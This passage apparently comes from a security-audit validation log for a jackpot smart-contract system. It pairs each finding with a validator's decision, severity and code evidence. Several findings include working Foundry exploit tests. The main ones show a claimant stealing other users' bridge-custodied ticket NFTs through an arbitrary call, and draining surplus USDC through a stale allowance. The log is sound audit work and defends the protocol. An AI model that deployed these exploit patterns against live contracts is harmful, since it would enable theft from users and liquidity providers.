LPs from the winning drawing lose the withheld referral-win-share amount, while LPs in an attacker-selected later drawing receive it. For large prizes this can move a material percentage of winnings between LP cohorts.

## Proof of Concept
1. A user buys a ticket without a referral scheme in drawing N. 2. The ticket wins and settlement subtracts the full tier payout from drawing N LP value. 3. The winner does not claim immediately. 4. The winner or an ally becomes a large LP in drawing M. 5. The winner calls `claimWinnings()` in drawing M. 6. `_payReferrersWinnings()` subtracts the referral win share from the winner but credits it to drawing M `lpEarnings`, not drawing N, so the attacker-controlled LP cohort captures value funded by drawing N LPs.

## Proof of Code
// Foundry-style regression core
function testNoReferralWinShareIsCreditedToCurrentDrawing() public {
    JackpotHarness jackpot = _deployHarness();
    MockNFT nft = jackpot.mockNFT();
    MockPayout calc = jackpot.mockPayout();

    uint256 winningPacked = (1 << 1) | (1 << 2) | (1 << 3) | (1 << 4) | (1 << 5) | (1 << 11);
    jackpot.hSetCurrentDrawingId(2);
    jackpot.hSetDrawing(1, winningPacked, 10, 20e16, 0);
    jackpot.hSetDrawing(2, 0, 10, 20e16, 0);

    nft.setTicket(777, address(this), 1, winningPacked, bytes32(0));
    calc.setPayout(1, 11, 100e6);

    uint256[] memory ids = new uint256[](1);
    ids[0] = 777;
    jackpot.claimWinnings(ids);

    assertEq(jackpot.hLpEarnings(1), 0);
    assertEq(jackpot.hLpEarnings(2), 20e6);
    assertEq(jackpot.mockUSDC().balanceOf(address(this)), 80e6);
}

## Suggested Mitigation
Store/credit no-referral win-share to the winning drawing's settlement accounting, or reduce `drawingUserWinnings` by the no-referral share during settlement. Do not use mutable `currentDrawingId` when accounting for a past drawing claim.
```

### Current Validated Block
### M-47 / `DY8_8XaFt5YlWy8JdsHMf`
- Finding Title: No-referral winning share is credited to the active drawing, letting winners redirect prior LP value to future LPs
- Decision: Valid
- Confidence: High
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `referral-share-wrong-epoch`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: The finding correctly identifies that a delayed no-referral claim can redirect retained win share from the settled drawing's LP accounting into the active drawing. Since winners can choose claim timing and LP positions can change between drawings, the value movement is attacker-influenced and can be material for large payouts.
- Code Evidence: In `contracts/Jackpot.sol`, `claimWinnings` computes the ticket's `drawingId` but `_payReferrersWinnings` credits `drawingState[currentDrawingId].lpEarnings` in the no-referral branch.

## M-50 / `4BnVTywm1gum72Soijtty`
- Finding title: Unpaid jackpot execution leaves expired drawings open for late ticket buyers
- Report lines: 3749-3783

### Original Report Block
```md
## [M-50]. Unpaid jackpot execution leaves expired drawings open for late ticket buyers

## id: 4BnVTywm1gum72Soijtty

## Derived From Pattern/Invariant
UnincentivizedMaintenanceOrKeeperlessProgress

## Exploit Type
IncentiveMisalignmentOrGameTheory

## Location
Jackpot.runJackpot

## Finding Status: Valid
### Finding Status Justification: buyTickets/_validateBuyTicketInputs never checks block.timestamp against drawingTime; only runJackpot checks drawing due time and locks the drawing. Because runJackpot requires an unrewarded caller to pay the entropy fee, a due drawing can remain unlocked and still accept tickets. The in-scope code has no purchase cutoff safeguard. Permissionless users can buy after drawingTime until runJackpot executes, so the issue is currently exploitable without privileged action or victim misuse.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
`runJackpot()` is required to lock and settle an expired drawing, but the caller pays both gas and the Pyth entropy fee and receives no protocol reimbursement or reward. At the same time, `buyTickets()` only checks `jackpotLock`, `allowTicketPurchases`, and `prizePool`; it does not reject purchases after `drawingTime`. If no altruistic keeper pays the entropy fee immediately, an expired drawing remains open and strategic users can buy tickets after the scheduled cutoff before calling `runJackpot()` themselves.

## Impact
Drawing progress depends on unpaid maintenance. Rational delay lets late entrants inspect all prior ticket distribution, buy after the advertised deadline, dilute earlier participants, and then trigger settlement only when it benefits them. If nobody pays the fee, claims and LP withdrawal finalization for that drawing are delayed indefinitely.

## Proof of Concept
1. Drawing time passes. 2. No keeper calls `runJackpot()` because it costs ETH and has no reward. 3. Attacker queries `checkIfTicketsBought()` / subset counts after the scheduled cutoff. 4. Attacker buys optimized tickets even though the drawing should be closed by time. 5. Attacker calls `runJackpot()` and participates in the expired drawing while earlier users were exposed to a longer-than-advertised entry window.

## Proof of Code
function testTicketsCanBeBoughtAfterDrawingTimeBeforeUnpaidRunJackpot() public { _startDrawing(); vm.warp(jackpot.getDrawingState(jackpot.currentDrawingId()).drawingTime + 1); deal(address(usdc), attacker, 10e6); vm.startPrank(attacker); usdc.approve(address(jackpot), type(uint256).max); uint256[] memory ids = jackpot.buyTickets(_oneTicket(), attacker, new address[](0), new uint256[](0), bytes32(0)); vm.stopPrank(); assertGt(ids.length, 0); }

## Suggested Mitigation
Close ticket purchases based on `drawingTime` inside `buyTickets()` and LP entry functions, or add a keeper incentive funded by protocol fees so `runJackpot()` is economically rational to call promptly. Consider reimbursing the entropy fee and gas premium to the caller.
```

### Current Validated Block
### M-50 / `4BnVTywm1gum72Soijtty`
- Finding Title: Unpaid jackpot execution leaves expired drawings open for late ticket buyers
- Decision: Valid
- Confidence: Med
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `late-ticket-entry`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: The important exploitable part is not just keeper incentives, but that expired drawings remain open for ticket purchases until someone pays to run and lock the jackpot. A strategic buyer can enter after `drawingTime` and before calling or front-running `runJackpot`, which weakens the advertised drawing cutoff and fairness. This is a live permissionless path.
- Code Evidence: `contracts/Jackpot.sol::buyTickets` does not check `drawingTime`; `_validateBuyTicketInputs` only checks `jackpotLock` and global purchase state. `runJackpot` enforces `drawingTime` only when locking the drawing.

## H-56 / `ScHOGndBOIJkw9PUyhBrl`
- Finding title: Arbitrary bridge call lets a winning claimant transfer other users' custodied ticket NFTs
- Report lines: 4082-4253

### Original Report Block
```md
## [H-56]. Arbitrary bridge call lets a winning claimant transfer other users' custodied ticket NFTs

## id: ScHOGndBOIJkw9PUyhBrl

## Derived From Pattern/Invariant
UncheckedLowLevelCallResults: user-controlled low-level call without NFT custody validation

## Exploit Type
AuthByPass

## Location
JackpotBridgeManager.claimWinnings

## Finding Status: Valid
### Finding Status Justification: claimWinnings authorizes the claimant's ticket IDs only, then _bridgeFunds executes arbitrary bridgeDetails.to.call(data) from the bridge manager. The manager is owner of bridge-custodied NFTs, so calling the ticket NFT's safeTransferFrom for a victim ticket is authorized at ERC721 level. The USDC delta check can be met by spending the approved winnings during the receiver callback. No code verifies unrelated NFT custody remains unchanged.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
`claimWinnings()` lets the ticket signer choose an arbitrary `_bridgeDetails.to` and `_bridgeDetails.data`. `_bridgeFunds()` approves `_bridgeDetails.approveTo`, then executes the raw call from the bridge manager itself and only verifies that exactly `_claimedAmount` USDC left the contract. It does not verify that the bridge manager still owns all unrelated JackpotTicketNFTs after the call.

Vulnerable snippet:

```
if (_bridgeDetails.approveTo != address(0)) {
    usdc.approve(_bridgeDetails.approveTo, _claimedAmount);
}

uint256 preUSDCBalance = usdc.balanceOf(address(this));
(bool success,) = _bridgeDetails.to.call(_bridgeDetails.data);

if (!success) revert BridgeFundsFailed();
uint256 postUSDCBalance = usdc.balanceOf(address(this));

if (preUSDCBalance - postUSDCBalance != _claimedAmount) revert NotAllFundsBridged();
```

An attacker who owns any claimable bridge ticket can set `approveTo` to an attacker ERC721 receiver contract, set `to` to the JackpotTicketNFT contract, and set `data` to `safeTransferFrom(address(this), attackerReceiver, victimTicketId)`. Because the low-level call is made by `JackpotBridgeManager`, the NFT contract sees `msg.sender == JackpotBridgeManager`, which is the owner of every bridge-custodied ticket. During `onERC721Received`, the attacker receiver spends the approved USDC amount from the bridge manager, satisfying the balance-delta check. The transaction succeeds with the attacker's own winnings bridged/spent and the victim's ticket NFT transferred out of bridge custody.

## Impact
The attacker can steal arbitrary bridge-custodied ticket NFTs. If the stolen ticket is a completed-drawing winner, the attacker can then call `Jackpot.claimWinnings()` directly as the ERC721 owner and steal the victim's payout. Future/current drawing tickets can also be stolen and claimed later if they win.

## Proof of Concept
1. Victim buys a bridge ticket, so `JackpotBridgeManager` owns the NFT and `ticketOwner[victimTicketId] == victim`.
2. Attacker buys a separate bridge ticket that has a positive payout and signs `ClaimWinningsData` for that attacker ticket.
3. The signed bridge details set `approveTo = attackerReceiver`, `to = jackpotTicketNFT`, and `data = safeTransferFrom(address(manager), attackerReceiver, victimTicketId)`.
4. `claimWinnings()` validates only the attacker's ticket ownership and claims the attacker's USDC winnings.
5. `_bridgeFunds()` approves the attacker receiver, then calls the NFT contract as the bridge manager, transferring the victim NFT.
6. The receiver callback pulls exactly the attacker's claimed USDC amount, so `NotAllFundsBridged` does not revert.
7. The attacker now owns the victim ticket NFT and can claim its Jackpot payout directly.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "../contracts/JackpotBridgeManager.sol";

contract MockUSDC is ERC20 {
    constructor() ERC20("USDC", "USDC") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract MockTicketNFT is ERC721, IJackpotTicketNFT {
    constructor() ERC721("Jackpot", "JACKPOT") {}
    mapping(uint256 => TrackedTicket) public info;
    function mintTicket(address recipient, uint256 ticketId, uint256 drawingId, uint256 packedTicket, bytes32 referralScheme) external {
        info[ticketId] = TrackedTicket(drawingId, packedTicket, referralScheme);
        _mint(recipient, ticketId);
    }
    function burnTicket(uint256 ticketId) external { _burn(ticketId); }
    function getTicketInfo(uint256 ticketId) external view returns (TrackedTicket memory) { return info[ticketId]; }
    function getUserTickets(address, uint256) external pure returns (ExtendedTrackedTicket[] memory out) { return out; }
}

contract MockJackpot is IJackpot {
    MockUSDC public usdc;
    MockTicketNFT public nft;
    uint256 public override currentDrawingId = 1;
    uint256 public override ticketPrice = 1e6;
    uint256[] public ids;
    uint256 public payout = 10e6;

    constructor(MockUSDC _usdc, MockTicketNFT _nft) { usdc = _usdc; nft = _nft; }
    function queueId(uint256 id) external { ids.push(id); }
    function buyTickets(Ticket[] memory tickets, address recipient, address[] memory, uint256[] memory, bytes32) external returns (uint256[] memory out) {
        usdc.transferFrom(msg.sender, address(this), tickets.length * ticketPrice);
        out = new uint256[](tickets.length);
        for (uint256 i; i < tickets.length; ++i) {
            out[i] = ids[i];
            nft.mintTicket(recipient, ids[i], 1, 1 << 1, bytes32(0));
        }
        delete ids;
    }
    function claimWinnings(uint256[] memory) external { usdc.transfer(msg.sender, payout); }
    function getUnpackedTicket(uint256, uint256) external pure returns (uint8[] memory normals, uint8 bonusball) { normals = new uint8[](5); bonusball = 1; }
}

contract PullOnReceive is IERC721Receiver {
    IERC20 public usdc;
    address public manager;
    uint256 public amount;
    constructor(IERC20 _usdc, address _manager, uint256 _amount) { usdc = _usdc; manager = _manager; amount = _amount; }
    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        usdc.transferFrom(manager, address(this), amount);
        return IERC721Receiver.onERC721Received.selector;
    }
}

contract JackpotBridgeManagerArbitraryCallPoC is Test {
    function testWinningClaimCanStealVictimTicket() external {
        uint256 attackerPk = 0xA11CE;
        address attacker = vm.addr(attackerPk);
        address victim = address(0xB0B);
        uint256 attackerTicket = 111;
        uint256 victimTicket = 222;

        MockUSDC usdc = new MockUSDC();
        MockTicketNFT nft = new MockTicketNFT();
        MockJackpot jackpot = new MockJackpot(usdc, nft);
        JackpotBridgeManager manager = new JackpotBridgeManager(jackpot, nft, usdc, "JackpotBridgeManager", "1");
        usdc.mint(address(jackpot), 100e6);
        usdc.mint(attacker, 1e6);
        usdc.mint(victim, 1e6);

        IJackpot.Ticket[] memory one = new IJackpot.Ticket[](1);
        one[0].normals = new uint8[](5);
        one[0].normals[0] = 1; one[0].normals[1] = 2; one[0].normals[2] = 3; one[0].normals[3] = 4; one[0].normals[4] = 5;
        one[0].bonusball = 1;
        address[] memory refs = new address[](0);
        uint256[] memory splits = new uint256[](0);

        jackpot.queueId(attackerTicket);
        vm.startPrank(attacker);
        usdc.approve(address(manager), 1e6);
        manager.buyTickets(one, attacker, refs, splits, bytes32(0));
        vm.stopPrank();

        jackpot.queueId(victimTicket);
        vm.startPrank(victim);
        usdc.approve(address(manager), 1e6);
        manager.buyTickets(one, victim, refs, splits, bytes32(0));
        vm.stopPrank();

        PullOnReceive receiver = new PullOnReceive(usdc, address(manager), jackpot.payout());
        uint256[] memory claimIds = new uint256[](1);
        claimIds[0] = attackerTicket;
        JackpotBridgeManager.RelayTxData memory details = JackpotBridgeManager.RelayTxData({
            approveTo: address(receiver),
            to: address(nft),
            data: abi.encodeWithSelector(IERC721.safeTransferFrom.selector, address(manager), address(receiver), victimTicket)
        });

        bytes32 digest = manager.createClaimWinningsEIP712Hash(claimIds, details);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(attackerPk, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        manager.claimWinnings(claimIds, details, sig);

        assertEq(nft.ownerOf(victimTicket), address(receiver));
        assertEq(usdc.balanceOf(address(receiver)), jackpot.payout());
    }
}

## Suggested Mitigation
Do not execute arbitrary signer-supplied calls from the bridge manager. Replace raw `_bridgeDetails.to.call(_bridgeDetails.data)` with allowlisted bridge adapters whose calldata shape is validated, or transfer USDC to a trusted bridge contract through a narrow interface. At minimum, block calls to `jackpotTicketNFT`, `jackpot`, `usdc`, and other protocol assets, validate bridge target/codehash/selectors, reset allowances to zero after the call, and enforce custody invariants for protocol-held NFTs/tokens after bridge execution.
```

### Current Validated Block
### H-56 / `ScHOGndBOIJkw9PUyhBrl`
- Finding Title: Arbitrary bridge call lets a winning claimant transfer other users' custodied ticket NFTs
- Decision: Valid
- Confidence: High
- Bug Exists: Yes
- Severity Assessment: High
- Root Cause Family: `bridge-arbitrary-call-custody`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: The bridge manager executes arbitrary calldata while holding all bridge NFTs. A winning claimant can use their own claim to make the manager call the NFT contract and transfer a victim ticket, while consuming the claimant's USDC allowance to satisfy the balance check. This is direct theft of unrelated custodied assets and reaches High severity.
- Code Evidence: `contracts/JackpotBridgeManager.sol::_bridgeFunds` exposes arbitrary `to.call(data)` from the manager and checks only USDC balance decrease. `buyTickets` mints bridge tickets to `address(this)` and records logical ownership separately, which `_bridgeFunds` does not protect.

## M-59 / `AmvuAyw8y2V0rkSpDDxav`
- Finding title: Arbitrary bridge call can leave reusable USDC allowance and steal pre-existing bridge surplus
- Report lines: 4480-4525

### Original Report Block
```md
## [M-59]. Arbitrary bridge call can leave reusable USDC allowance and steal pre-existing bridge surplus

## id: AmvuAyw8y2V0rkSpDDxav

## Derived From Pattern/Invariant
ArbitraryExternalCall

## Exploit Type
ArbitraryExternalCall

## Location
JackpotBridgeManager.claimWinnings

## Finding Status: Valid
### Finding Status Justification: _bridgeFunds approves arbitrary approveTo for claimedAmount, executes arbitrary calldata, checks only that claimedAmount left, and leaves allowance uncleared. A claimant can directly transfer claimedAmount out via the arbitrary call, leaving the approval unused, then use transferFrom to drain pre-existing manager USDC up to the stale allowance. This path is available in current code whenever the manager has surplus and the claimant has positive winnings.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
_bridgeFunds approves an arbitrary `approveTo` for the claimed amount, then performs an arbitrary call to `bridgeDetails.to` with signer-controlled calldata, and never clears the allowance. The balance-delta check only proves that exactly the claimed amount left during the call; it does not prove the allowance was consumed or that no reusable approval remains. Vulnerable snippet: `if (_bridgeDetails.approveTo != address(0)) { usdc.approve(_bridgeDetails.approveTo, _claimedAmount); } ... (bool success,) = _bridgeDetails.to.call(_bridgeDetails.data); ... if (preUSDCBalance - postUSDCBalance != _claimedAmount) revert NotAllFundsBridged();`. A claimant can set `approveTo` to themselves and set `to` to the USDC token with calldata for `transfer(attacker, claimedAmount)`. The direct transfer satisfies the bridge balance delta while the approval remains unused. The attacker can then call `transferFrom` to drain any pre-existing USDC surplus in the bridge manager, including surplus created by the ticket-price mismatch in buyTickets.

## Impact
Any existing USDC balance in JackpotBridgeManager that is not part of the current claim can be stolen up to the attacker's claimed winning amount. This turns otherwise stuck or overcharged bridge funds into permissionlessly drainable funds for any winning claimant.

## Proof of Concept
1. JackpotBridgeManager holds 20 USDC of unrelated surplus. 2. Attacker owns a bridge ticket with 10 USDC of claimable winnings. 3. Attacker signs ClaimWinningsData with `approveTo = attacker`, `to = USDC`, and `data = USDC.transfer(attacker, 10 USDC)`. 4. claimWinnings receives 10 USDC from Jackpot, approves attacker for 10 USDC, then directly transfers 10 USDC to attacker. The balance delta equals the claimed amount, so the call succeeds. 5. Because the allowance was not used, attacker calls USDC.transferFrom(bridgeManager, attacker, 10 USDC) and steals half of the unrelated surplus.

## Proof of Code
pragma solidity ^0.8.28;
import {Test} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {JackpotBridgeManager} from "../contracts/JackpotBridgeManager.sol";
import {IJackpot} from "../contracts/interfaces/IJackpot.sol";
import {IJackpotTicketNFT} from "../contracts/interfaces/IJackpotTicketNFT.sol";

contract MockUSDC2 is ERC20 { constructor() ERC20("USDC", "USDC") {} function mint(address to, uint256 amount) external { _mint(to, amount); } function decimals() public pure override returns (uint8) { return 6; } }
contract MockNFT2 is IJackpotTicketNFT { function mintTicket(address,uint256,uint256,uint256,bytes32) external {} function burnTicket(uint256) external {} function getTicketInfo(uint256) external pure returns (TrackedTicket memory) { return TrackedTicket(0,0,bytes32(0)); } function getUserTickets(address,uint256) external pure returns (ExtendedTrackedTicket[] memory out) { out = new ExtendedTrackedTicket[](0); } }
contract WinningJackpotMock is IJackpot { MockUSDC2 public token; uint256 public override ticketPrice = 1e6; uint256 public override currentDrawingId = 1; uint256 public prize = 10e6; constructor(MockUSDC2 _token) { token = _token; } function buyTickets(Ticket[] memory tickets, address, address[] memory, uint256[] memory, bytes32) external returns (uint256[] memory ids) { token.transferFrom(msg.sender, address(this), ticketPrice * tickets.length); ids = new uint256[](tickets.length); ids[0] = 777; } function claimWinnings(uint256[] memory) external { token.transfer(msg.sender, prize); } function getUnpackedTicket(uint256,uint256) external pure returns (uint8[] memory normals, uint8 bonusball) { normals = new uint8[](0); bonusball = 0; } }
contract BridgeResidualApprovalPoC is Test { function testResidualApprovalDrainsSurplus() external { uint256 pk = 0xA11CE; address attacker = vm.addr(pk); MockUSDC2 usdc = new MockUSDC2(); WinningJackpotMock jackpot = new WinningJackpotMock(usdc); JackpotBridgeManager manager = new JackpotBridgeManager(jackpot, new MockNFT2(), usdc, "Bridge", "1"); usdc.mint(attacker, 1e6); usdc.mint(address(jackpot), 10e6); IJackpot.Ticket[] memory tickets = new IJackpot.Ticket[](1); tickets[0].normals = new uint8[](5); tickets[0].normals[0]=1; tickets[0].normals[1]=2; tickets[0].normals[2]=3; tickets[0].normals[3]=4; tickets[0].normals[4]=5; tickets[0].bonusball=1; vm.startPrank(attacker); usdc.approve(address(manager), 1e6); manager.buyTickets(tickets, attacker, new address[](0), new uint256[](0), bytes32(0)); vm.stopPrank(); usdc.mint(address(manager), 20e6); uint256[] memory ids = new uint256[](1); ids[0] = 777; JackpotBridgeManager.RelayTxData memory bridge = JackpotBridgeManager.RelayTxData({approveTo: attacker, to: address(usdc), data: abi.encodeCall(IERC20.transfer, (attacker, 10e6))}); bytes32 digest = manager.createClaimWinningsEIP712Hash(ids, bridge); (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, digest); bytes memory sig = abi.encodePacked(r, s, v); manager.claimWinnings(ids, bridge, sig); assertEq(usdc.balanceOf(address(manager)), 20e6); assertEq(usdc.allowance(address(manager), attacker), 10e6); vm.prank(attacker); usdc.transferFrom(address(manager), attacker, 10e6); assertEq(usdc.balanceOf(address(manager)), 10e6); assertEq(usdc.balanceOf(attacker), 20e6); } }

## Suggested Mitigation
Restrict bridge targets and approval spenders to an allowlist, or require the bridge call to consume allowance through a known adapter. After the external call, always reset any nonzero USDC allowance to zero. Prefer transferring funds into a vetted bridge adapter directly rather than exposing raw arbitrary calls from the custodian.
```

### Current Validated Block
### M-59 / `AmvuAyw8y2V0rkSpDDxav`
- Finding Title: Arbitrary bridge call can leave reusable USDC allowance and steal pre-existing bridge surplus
- Decision: Valid
- Confidence: High
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `bridge-stale-allowance`
- Checklist Gates Passed: `Stage0, scope, supported-behavior, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `high-impact`
- Detailed Reason: This narrower surplus-drain version is valid. A claimant can move the current claimed amount with a direct token transfer while leaving the separate `approveTo` allowance unused, then use the stale allowance to pull idle USDC already held by the bridge manager. The impact is bounded by existing surplus and the claimed amount, so Medium is appropriate.
- Code Evidence: `contracts/JackpotBridgeManager.sol::_bridgeFunds` sets `usdc.approve(approveTo, claimedAmount)` before the arbitrary call and never clears it. Its only postcondition is the exact USDC balance delta during the call.

## H-60 / `DCLCnC_dWz7GX-y5h94Yu`
- Finding title: ScaledEntropyProvider reuses one entropy seed for all random sets, correlating normal balls and bonusball
- Report lines: 4526-4603

### Original Report Block
```md
## [H-60]. ScaledEntropyProvider reuses one entropy seed for all random sets, correlating normal balls and bonusball

## id: DCLCnC_dWz7GX-y5h94Yu

## Derived From Pattern/Invariant
Same Seed / Correlated Randomness

## Exploit Type
Oracle

## Location
ScaledEntropyProvider._getScaledRandomness

## Finding Status: Valid
### Finding Status Justification: _getScaledRandomness passes uint256(_randomNumber) unchanged into every SetRequest. FisherYatesRejection.draw starts nonce at zero for each call, so two requests with equal ranges share the same shuffled prefix; Jackpot requests normal balls and bonusball as separate sets. When ranges align, the one-sample bonusball output equals the first normal draw, proving correlation. No per-set domain separator exists. The code is in ScaledEntropyProvider, an in-scope production contract. This is currently exploitable through ticket strategy when relevant ranges overlap, without privileged action.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
`_getScaledRandomness()` passes the exact same `_randomNumber` into every requested set without a per-set nonce or domain separator. Jackpot requests normal balls and the bonusball as two separate sets, so when the ranges align the bonusball is deterministically the first normal draw, and for other overlapping ranges the outputs remain correlated rather than independent.

Vulnerable snippet:
`for (uint256 i = 0; i < _setRequests.length; i++) { ... FisherYatesRejection.draw(..., uint256(_randomNumber)); ... }`

The payout model and ticket strategy assume independent normal-ball and bonusball dimensions. A buyer can choose tickets with bonusball values correlated to their selected normals to improve expected tier outcomes, shifting value from LPs and honest buyers over repeated drawings.

## Impact
Unfair jackpot outcomes and value leakage from LPs/honest participants because bonusball-match probabilities are not the probabilities used by the payout model.

## Proof of Concept
1. Configure a drawing where `bonusballMax == normalBallMax` or where ranges materially overlap.
2. Jackpot requests two randomness sets using the same Pyth entropy value: 5 normal balls from `[1, normalBallMax]` and 1 bonusball from `[1, bonusballMax]`.
3. Because the same seed and nonce sequence are reused, the one-sample bonusball draw equals the first element of the five-sample normal draw when ranges are equal.
4. A ticket buyer biases purchases toward correlated bonusball/normal selections, increasing expected bonusball-tier hit rate versus the intended independent distribution.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "../contracts/ScaledEntropyProvider.sol";
import "../contracts/interfaces/IScaledEntropyProvider.sol";

contract ScaledEntropyHarness is ScaledEntropyProvider {
    constructor() ScaledEntropyProvider(address(0x1), address(0x2)) {}

    function exposed(bytes32 seed, IScaledEntropyProvider.SetRequest[] memory reqs)
        external
        pure
        returns (uint256[][] memory)
    {
        return _getScaledRandomness(seed, reqs);
    }
}

contract CorrelatedEntropyPoC is Test {
    function testBonusballEqualsFirstNormalWhenRangesMatch() external {
        ScaledEntropyHarness h = new ScaledEntropyHarness();
        IScaledEntropyProvider.SetRequest[] memory reqs = new IScaledEntropyProvider.SetRequest[](2);
        reqs[0] = IScaledEntropyProvider.SetRequest({samples: 5, minRange: 1, maxRange: 35, withReplacement: false});
        reqs[1] = IScaledEntropyProvider.SetRequest({samples: 1, minRange: 1, maxRange: 35, withReplacement: false});

        uint256[][] memory out = h.exposed(keccak256("seed"), reqs);

        assertEq(out[1][0], out[0][0]);
        bool bonusInNormals;
        for (uint256 i; i < 5; i++) {
            if (out[0][i] == out[1][0]) bonusInNormals = true;
        }
        assertTrue(bonusInNormals);
    }
}

## Suggested Mitigation
Domain-separate every requested set and every sample stream. For example, derive `setSeed = uint256(keccak256(abi.encode(_randomNumber, i)))` for each request, and ensure replacement draws also include a request-specific domain before their internal nonce.
```

### Current Validated Block
### H-60 / `DCLCnC_dWz7GX-y5h94Yu`
- Finding Title: ScaledEntropyProvider reuses one entropy seed for all random sets, correlating normal balls and bonusball
- Decision: Valid
- Confidence: Med
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `entropy-stream-correlation`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `high-impact`
- Detailed Reason: `_getScaledRandomness` reuses the same seed for every set, and each draw routine starts its nonce at zero, so separate sets are not domain-separated. Jackpot requests normal balls and bonusball as separate sets; when ranges overlap or match, the bonusball stream is correlated with the normal-ball stream, violating the intended independent lottery dimensions. The fairness and EV impact is real but probabilistic, so I assess Medium rather than High.
- Code Evidence: `contracts/ScaledEntropyProvider.sol::_getScaledRandomness` passes `uint256(_randomNumber)` unchanged to every `FisherYatesRejection.draw` or `_drawWithReplacement` call. `contracts/lib/FisherYatesWithRejection.sol::draw` initializes `nonce = 0` for each draw, and `Jackpot.runJackpot` creates separate normal and bonusball set requests.

## M-70 / `JNirY2A5L7N-4sAPEQSSD`
- Finding title: Entropy provider migration can overwrite pending requests with colliding sequence numbers
- Report lines: 5216-5361

### Original Report Block
```md
## [M-70]. Entropy provider migration can overwrite pending requests with colliding sequence numbers

## id: JNirY2A5L7N-4sAPEQSSD

## Derived From Pattern/Invariant
StorageCollisionOrSelectorClash: provider-local sequence numbers are stored under an unscoped global key

## Exploit Type
BeaconFactoryAuthorityDrift

## Location
ScaledEntropyProvider.setEntropyProvider / requestAndCallbackScaledRandomness / entropyCallback

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: ScaledEntropyProvider stores pending requests by sequence only and ignores provider in entropyCallback. setEntropyProvider has no check that no old requests are pending, and _storePendingRequest does not reject overwrites. This permits a same sequence from a new provider to replace an old provider request. It is current code, but depends on an owner-only migration.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
`ScaledEntropyProvider` stores pending entropy requests only by `uint64 sequence` and ignores the `provider` argument later supplied by Pyth. Pyth provider sequence numbers are provider-local, so changing `entropyProvider` while old requests are pending can cause a new provider request to return the same sequence and overwrite the old pending entry. The old provider's later fulfillment will then be delivered to the new request's callback/context, while the real new fulfillment reverts as `UnknownSequence`.

Vulnerable snippets:
```solidity
mapping(uint64 => PendingRequest) private pending;

function setEntropyProvider(address _entropyProvider) external onlyOwner {
    if (_entropyProvider == address(0)) revert ZeroAddress();
    entropyProvider = _entropyProvider;
}

function entropyCallback(uint64 sequence, address /*provider*/, bytes32 randomNumber) internal override {
    PendingRequest memory req = pending[sequence];
    if (req.callback == address(0)) revert UnknownSequence();
    delete pending[sequence];
    ...
}

function _storePendingRequest(uint64 sequence, ...) internal {
    pending[sequence].callback = msg.sender;
    ...
}
```

This violates the documented behavior that provider updates only affect future requests; unresolved old-provider requests can be overwritten by future-provider requests because the key omits provider identity and no existing pending entry is checked before writing.

## Impact
A normal provider rotation can corrupt or lose in-flight randomness requests. For an integrated jackpot, this can settle the wrong drawing/context with randomness from a different provider request or leave the intended drawing permanently unfulfilled, blocking jackpot progression and requiring emergency handling.

## Proof of Concept
1. A contract requests randomness through provider A and receives sequence `1`; `pending[1]` stores its callback/context.
2. The owner rotates to provider B while provider A's sequence `1` is still pending.
3. Any caller requests randomness through provider B. Because provider B has its own sequence counter, it also returns sequence `1`.
4. `_storePendingRequest(1, ...)` overwrites the provider A pending request.
5. Provider A fulfills old sequence `1`; `entropyCallback` ignores the provider argument and delivers provider A's randomness to provider B's callback/context.
6. Provider B's real fulfillment for sequence `1` later reverts with `UnknownSequence`, leaving that request lost.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "../contracts/ScaledEntropyProvider.sol";
import "../contracts/interfaces/IScaledEntropyProvider.sol";
import "@pythnetwork/entropy-sdk-solidity/IEntropyConsumer.sol";

contract MockEntropy {
    mapping(address => uint64) public nextSeq;

    function getFeeV2(address, uint32) external pure returns (uint128) {
        return 0;
    }

    function requestV2(address provider, uint32) external payable returns (uint64) {
        nextSeq[provider] += 1;
        return nextSeq[provider];
    }

    function fulfill(address consumer, uint64 sequence, address provider, bytes32 randomNumber) external {
        IEntropyConsumer(consumer)._entropyCallback(sequence, provider, randomNumber);
    }
}

contract Receiver {
    IScaledEntropyProvider public immutable sep;
    uint256 public calls;
    uint64 public lastSequence;
    bytes public lastContext;

    constructor(IScaledEntropyProvider _sep) {
        sep = _sep;
    }

    function request(bytes memory context) external returns (uint64) {
        IScaledEntropyProvider.SetRequest[] memory reqs = new IScaledEntropyProvider.SetRequest[](1);
        reqs[0] = IScaledEntropyProvider.SetRequest({
            samples: 1,
            minRange: 1,
            maxRange: 10,
            withReplacement: true
        });
